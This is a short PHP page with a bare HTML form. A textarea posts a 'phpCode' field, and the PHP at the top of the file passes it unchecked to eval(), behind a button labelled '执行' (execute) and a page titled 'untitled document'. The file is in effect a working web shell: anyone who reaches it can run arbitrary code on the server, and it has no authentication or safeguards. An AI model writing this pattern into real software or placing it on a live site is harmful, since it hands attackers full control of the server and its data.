<?php

	header("Content-type:text/html;charset=utf-8");

	if($_POST)
	{
		$str = $_POST['phpCode'];	
		eval($str);
	}
?>
<!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Transitional//EN" "http://www.w3.org/TR/xhtml1/DTD/xhtml1-transitional.dtd">
<html xmlns="http://www.w3.org/1999/xhtml">
<head>
<meta http-equiv="Content-Type" content="text/html; charset=utf-8" />
<title>无标题文档</title>
</head>

<body>
<form action="" method="post">
<textarea cols="100" rows="30" name="phpCode"></textarea>
<button type="submit">执行</button>

</form>
</body>
</html>